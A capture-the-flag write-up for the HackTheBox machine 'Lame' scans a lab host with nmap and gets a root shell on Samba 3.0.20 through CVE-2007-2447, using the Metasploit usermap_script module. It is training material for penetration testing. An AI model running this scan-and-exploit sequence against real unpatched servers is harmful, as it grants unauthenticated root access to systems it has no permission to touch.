# Lame - HackTheBox - Easy

## Summary
The machine runs Samba 3.0.20, vulnerable to a command injection 
exploit (CVE-2007-2447) via the username field in the MS-RPC SamrChangePassword 
function. Exploiting it yields a direct root shell with no privesc needed.

## Tools
- nmap
- metasploit

## 1. Enumeration
### Port Scanning

```bash
nmap -sC -sV -p- -O 172.17.0.2
```

```

139/tcp open netbios-ssn Samba smbd 3.X - 4.X
445/tcp open netbios-ssn Samba smbd 3.0.20-Debian
```

## 2. Exploitation

### CVE-2007-2447 — Samba 3.0.20 Username Map Script
Samba 3.0.20 passes unfiltered user input to `/bin/sh` when the `username map script` option is enabled, allowing arbitrary command injection via the username field.

We search on internet with "Samba smbd 3.0.20-Debian" for vulnerabilities. The module name on Metasploit is `exploit/multi/samba/usermap_script`.

```sh
msfconsole
use exploit/multi/samba/usermap_script
set RHOSTS 172.17.0.2
run

whoami
> root
```

## 3. Lessons Learned
- Always enumerate SMB version — Samba 3.0.20 is a well-known critical CVE
- `smbclient -L //<IP> -N` reveals available shares without credentials
- CVE-2007-2447 requires no authentication — direct root from a single exploit
- When multiple vulnerable services exist, prioritize the one with highest impact
  (Samba RCE > FTP backdoor > SSH enumeration)
